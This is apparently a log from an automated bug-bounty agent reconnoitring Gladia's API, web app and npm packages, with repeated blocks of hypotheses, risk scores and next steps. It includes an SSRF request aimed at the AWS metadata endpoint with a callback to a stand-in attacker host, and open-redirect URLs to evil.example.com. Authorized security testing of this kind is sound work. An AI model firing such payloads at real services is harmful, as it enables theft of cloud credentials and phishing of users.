+verify_steps: AUTH_HELPED — POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://attacker.lh/meta"}'
+impact: AWS IMDSv1 metadata access, internal service enumeration, data exfiltration via callback_url. severity High.
+testability: AUTH_HELPED
+
+[HYP] Post-auth open redirect via reflected redirect_to on /signin form action + CSP form-action gap
+class: OATH
+asset: app.gladia.io /signin
+confidence: 65
+reasoning: Fresh 17:44 UTC probe confirms /signin?redirect_to=https://evil.example.com -> 200, action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" reflection; CSP verified has NO form-action directive (base-uri 'self', object-src 'none', frame-src allowlist); OAuth redirect_uri is FIXED (https://app.gladia.io/auth/google/callback) -> OAuth code/state theft REJECTED; return-to cookie tamper-reset REJECTED. Post-auth honoring is sole unverified gate.
+evidence_needed: post-auth 302 Location: https://evil.example.com after completing Google OAuth (or email/password) on /signin?redirect_to=https://evil.example.com
+verify_steps: HUMAN_ONLY — with program authorization, complete Google OAuth (or email/password) on app.gladia.io/signin?redirect_to=https://evil.example.com and capture final 302 Location + Set-Cookie
+impact: Post-auth phishing redirect to attacker-controlled host -> brand-spoof after victim authenticates. severity Medium.
+testability: HUMAN_ONLY
+
+### STEP 4 — SELF-CRITIQUE
+All 3 hypotheses: confidence >=40, classes (OTHER/SSRF/OATH) all ACCEPTED (not on REJECTED list), concrete verify_steps present. No drops.
+[PARKED] None
+
+[FINAL]
+1. npm gladia@0.1.3 orphaned impersonation w/ WS key-in-URL (95, OTHER, RAG) — submission-ready
+2. api.gladia.io SSRF via audio_url/video_url/callback_url (73, AUTH_HELPED) — submission-ready with valid key
+3. app.gladia.io /signin redirect_to post-auth open redirect (65, OATH, HUMAN_ONLY) — sole unverified gate
+
+[NEXT] HUMAN: Phase is POC, target app. With program authorization, complete the Google OAuth (or email/password) flow on https://app.gladia.io/signin?redirect_to=https://evil.example.com and capture the final post-auth 302 Location + Set-Cookie. This is the sole unverified gate for the app OATH finding (unauth reflection + CSP gap already confirmed via fresh passive probe at 17:44 UTC). If no authorized Google test account exists, request a Gladia-issued test credential to observe post-auth redirect honoring via the email/password flow. api/npm surfaces remain NO_DRIFT frozen; api SSRF hypothesis is submission-ready for AUTH_HELPED verification with a valid key in parallel.
+
+[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 20+ cycles (23:08->17:44 UTC) — openapi 125131B/14 paths, /health {"health":"OK"} 15B, /v1/models 530B FR/US, preflight-only x-powered-by: Express, CORS static * + ACAH x-gladia-key — surface frozen, nothing new to report.
+[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed fresh 17:44 UTC — sha256 3b23ec7d...7f2 unchanged, dist-tag latest=0.1.3, repo alexisbouchez/gladia.ts + user 404 (orphaned), README "Unofficial" vs package.json "Official" contradiction, src/client.ts:307 appends raw x-gladia-key to wss://api.gladia.io/v2/live URL query. | @gladiaio/sdk@1.1.0 confirmed official from gladiaio org.
+[LEARN] ACCEPTED SSRF @ api.gladia.io: spec+RAG confirmed fresh 17:44 UTC (NO_DRIFT 20th cycle) — audio_url/video_url/callback_url format:uri no scheme allowlist; /v1/models 530B FR/US egress; POST /v2/pre-recorded 401 NestJS HttpException — key-gated only, SSRF-by-design persists (AUTH_HELPED).
+[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:44 UTC — form action reflects URL-encoded value; CSP lacks form-action directive (gap confirmed); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate. /auth/google/callback returns 200 (OAuth callback path live).
+[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed at 17:44 UTC).
+
+[RISK] api.gladia.io: 85 — Public OpenAPI 14 paths/CORS *; CORS * + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 20 cycles.
+[RISK] app.gladia.io: 65 — /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.
+[RISK] sdk: 85 — Official @gladiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + README/package.json "Official/Unofficial" contradiction; supply-chain risk High.
+ENDOFANALYSIS
+(no output)
+[0m
+[0m$ [0mtail -20 /home/runner/work/gladia-hunt/gladia-hunt/leads/lead-laguna.md
+### STEP 4 — SELF-CRITIQUE
+All 3 hypotheses: confidence >=40, classes (OTHER/SSRF/OATH) all ACCEPTED (not on REJECTED list), concrete verify_steps present. No drops.
+[PARKED] None
+
+[FINAL]
+1. npm gladia@0.1.3 orphaned impersonation w/ WS key-in-URL (95, OTHER, RAG) — submission-ready
+2. api.gladia.io SSRF via audio_url/video_url/callback_url (73, AUTH_HELPED) — submission-ready with valid key
+3. app.gladia.io /signin redirect_to post-auth open redirect (65, OATH, HUMAN_ONLY) — sole unverified gate
+
+[NEXT] HUMAN: Phase is POC, target app. With program authorization, complete the Google OAuth (or email/password) flow on https://app.gladia.io/signin?redirect_to=https://evil.example.com and capture the final post-auth 302 Location + Set-Cookie. This is the sole unverified gate for the app OATH finding (unauth reflection + CSP gap already confirmed via fresh passive probe at 17:44 UTC). If no authorized Google test account exists, request a Gladia-issued test credential to observe post-auth redirect honoring via the email/password flow. api/npm surfaces remain NO_DRIFT frozen; api SSRF hypothesis is submission-ready for AUTH_HELPED verification with a valid key in parallel.
+
+[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 20+ cycles (23:08->17:44 UTC) — openapi 125131B/14 paths, /health {"health":"OK"} 15B, /v1/models 530B FR/US, preflight-only x-powered-by: Express, CORS static * + ACAH x-gladia-key — surface frozen, nothing new to report.
+[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed fresh 17:44 UTC — sha256 3b23ec7d...7f2 unchanged, dist-tag latest=0.1.3, repo alexisbouchez/gladia.ts + user 404 (orphaned), README "Unofficial" vs package.json "Official" contradiction, src/client.ts:307 appends raw x-gladia-key to wss://api.gladia.io/v2/live URL query. | @gladiaio/sdk@1.1.0 confirmed official from gladiaio org.
+[LEARN] ACCEPTED SSRF @ api.gladia.io: spec+RAG confirmed fresh 17:44 UTC (NO_DRIFT 20th cycle) — audio_url/video_url/callback_url format:uri no scheme allowlist; /v1/models 530B FR/US egress; POST /v2/pre-recorded 401 NestJS HttpException — key-gated only, SSRF-by-design persists (AUTH_HELPED).
+[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:44 UTC — form action reflects URL-encoded value; CSP lacks form-action directive (gap confirmed); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate. /auth/google/callback returns 200 (OAuth callback path live).
+[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed at 17:44 UTC).
+
+[RISK] api.gladia.io: 85 — Public OpenAPI 14 paths/CORS *; CORS * + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 20 cycles.
+[RISK] app.gladia.io: 65 — /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.
+[RISK] sdk: 85 — Official @gladiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + README/package.json "Official/Unofficial" contradiction; supply-chain risk High.
+[0m
+## 2026-08-08 17:44:00 UTC [app] (model laguna)
+
+### STEP 1 — DELTA
+NO_DELTA — Fresh passive probes at 17:44 UTC confirm surface byte-identical across all assets (20th consecutive NO_DRIFT cycle):
+- api.gladia.io: /openapi.json 125131B/14 paths, /health 15B (x-powered-by ABSENT on GET), /v1/models 530B FR/US, OPTIONS x-powered-by:Express + ACAO `*`, POST /v2/pre-recorded 401 NestJS shape — all frozen
+- app.gladia.io: /signin?redirect_to=https://evil.example.com → 200, form action reflects, CSP no form-action, /auth/google/callback 200, /dashboard 200 SPA — all stable
+- npm: gladia@0.1.3 latest=0.1.3, repository=alexisbouchez/gladia.ts, GitHub user+repo 404 (orphaned), @glidiaio/sdk 1.1.0 official — frozen
+- reposcan-latest.md (17:30 UTC): 5647 files, 617 hits, delta=0
+
+### STEP 2 — PRIORITIZE
+- [PRIO] npm registry / gladia@0.1.3 — 9.2 | attack:10, business:9, tech:8, gate:10, cloud:7, fresh:10
+- [PRIO] api.gladia.io /v2/pre-recorded (SSRF surface) — 8.4 | attack:9, business:10, tech:8, gate:3, cloud:10, fresh:10
+- [PRIO] app.gladia.io /signin (OATH) — 8.3 | attack:8, business:9, tech:8, gate:10, cloud:3, fresh:10
+
+### STEP 3 — HYPOTHESES
+
+[HYP] Orphaned npm package gladia@0.1.3 impersonates official SDK, leaking API key in WebSocket URL
+class: OTHER
+asset: npm registry / gladia@0.1.3
+confidence: 95
+reasoning: Fresh 17:44 UTC probe confirms npm view latest=0.1.3, repository=alexisbouchez/gladia.ts (personal), maintainer=softwarecitadel@gmail.com; GitHub API returns 404 on both user and repo (orphaned); @glidaio/sdk@1.1.0 points to gladiaio/sdk org (official). src/client.ts:306–307 appends raw x-gladia-key to wss://api.gladia.io/v2/live via searchParams.append, diverging from official SDK POST /v2/live-then-token flow.
+evidence_needed: Tarball src/client.ts with searchParams.append of API key into wss URL query; npm metadata showing personal repo; GitHub 404 on user+repo; package.json "Official" vs README "Unofficial"
+verify_steps: RAG — `tar -xzf gladia-0.1.3.tgz; grep -n 'searchParams.append' package/src/client.ts; npm view gladia repository,maintainers; curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/users/alexisbouchez; curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/repos/alexisbouchez/gladia.ts`
+impact: Supply-chain credential theft — devs install impersonated SDK; API keys leak into URL query strings, proxy logs, Referer headers, server-side request logs. severity High.
+testability: RAG
+
+[HYP] SSRF via server-side fetch of audio_url/video_url/callback_url on /v2/pre-recorded
+class: SSRF
+asset: api.gladia.io /v2/pre-recorded
+confidence: 73
+reasoning: Fresh 17:44 UTC probe confirms POST /v2/pre-recorded (no key) → 401 NestJS HttpException; /openapi.json (125131B, 14 paths) exposes InitTranscriptionRequest.audio_url, video_url, callback_url, CallbackConfigDto.url all as format:uri with no scheme allowlist; /v1/models (530B, CORS *) leaks FR+US egress regions; key-gated only.
+evidence_needed: Server-side fetch reaches 169.254.169.254 (AWS IMDSv1) or localhost/private CIDR; callback_url exfil path confirmed.
+verify_steps: AUTH_HELPED — `POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://attacker.lh/meta"}'`
+impact: AWS IMDSv1 metadata access, internal service enumeration, data exfiltration via callback_url. severity High.
+testability: AUTH_HELPED
+
+[HYP] Post-auth open redirect via reflected redirect_to on /signin form action + CSP form-action gap
+class: OATH
+asset: app.gladia.io /signin
+confidence: 65
+reasoning: Fresh 17:44 UTC probe confirms /signin?redirect_to=https://evil.example.com → 200, action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" reflection; CSP verified has NO form-action directive (base-uri 'self', object-src 'none', frame-src allowlist); OAuth redirect_uri is FIXED (https://app.gladia.io/auth/google/callback) → OAuth code/state theft REJECTED; return-to cookie tamper-reset REJECTED. Post-auth honoring is sole unverified gate.
+evidence_needed: post-auth 302 Location: https://evil.example.com after completing Google OAuth (or email/password) on /signin?redirect_to=https://evil.example.com
+verify_steps: HUMAN_ONLY — with program authorization, complete Google OAuth (or email/password) on app.gladia.io/signin?redirect_to=https://evil.example.com and capture final 302 Location + Set-Cookie
+impact: Post-auth phishing redirect to attacker-controlled host → brand-spoof after victim authenticates. severity Medium.
+testability: HUMAN_ONLY
+
+### STEP 4 — SELF-CRITIQUE
+All 3 hypotheses: confidence ≥40, classes (OTHER/SSRF/OATH) all ACCEPTED (not on REJECTED list), concrete verify_steps present. No drops.
+[PARKED] None
+
+[FINAL]
+1. npm gladia@0.1.3 orphaned impersonation w/ WS key-in-URL (95, OTHER, RAG) — submission-ready
+2. api.gladia.io SSRF via audio_url/video_url/callback_url (73, AUTH_HELPED) — submission-ready with valid key
+3. app.gladia.io /signin redirect_to post-auth open redirect (65, OATH, HUMAN_ONLY) — sole unverified gate
+
+[NEXT] HUMAN: Phase is POC, target app. With program authorization, complete the Google OAuth (or email/password) flow on `https://app.gladia.io/signin?redirect_to=https://evil.example.com` and capture the final post-auth `302 Location` + `Set-Cookie`. This is the sole unverified gate for the app OATH finding (unauth reflection + CSP gap already confirmed via fresh passive probe at 17:44 UTC). If no authorized Google test account exists, request a Gladia-issued test credential to observe post-auth redirect honoring via the email/password flow. api/npm surfaces remain NO_DRIFT frozen; api SSRF hypothesis is submission-ready for AUTH_HELPED verification with a valid key in parallel.
+
+[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 20+ cycles (23:08→17:44 UTC) — openapi 125131B/14 paths, /health `{"health":"OK"}` 15B, /v1/models 530B FR/US, preflight-only x-powered-by: Express, CORS static `*` + ACAH x-gladia-key — surface frozen, nothing new to report.
+[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed fresh 17:44 UTC — sha256 `3b23ec7d…7f2` unchanged, dist-tag latest=0.1.3, repo alexisbouchez/gladia.ts + user 404 (orphaned), README "Unofficial" vs package.json "Official" contradiction, src/client.ts:307 appends raw x-gladia-key to wss URL query. | @gladiaio/sdk@1.1.0 confirmed official from gladiaio org.
+[LEARN] ACCEPTED SSRF @ api.gladia.io: spec+RAG confirmed fresh 17:44 UTC (NO_DRIFT 20th cycle) — audio_url/video_url/callback_url format:uri no scheme allowlist; /v1/models 530B FR/US egress; POST /v2/pre-recorded 401 NestJS HttpException — key-gated only, SSRF-by-design persists (AUTH_HELPED).
+[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:44 UTC — form action reflects URL-encoded value; CSP lacks form-action directive (gap confirmed); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate. /auth/google/callback returns 200 (OAuth callback path live).
+[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed at 17:44 UTC).
+
+[RISK] api.gladia.io: 85 — Public OpenAPI 14 paths/CORS `*`; CORS `*` + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 20 cycles.
+[RISK] app.gladia.io: 65 — /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.
+[RISK] sdk: 85 — Official @glidiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + README↔package.json "Official/Unofficial" contradiction; supply-chain risk High.
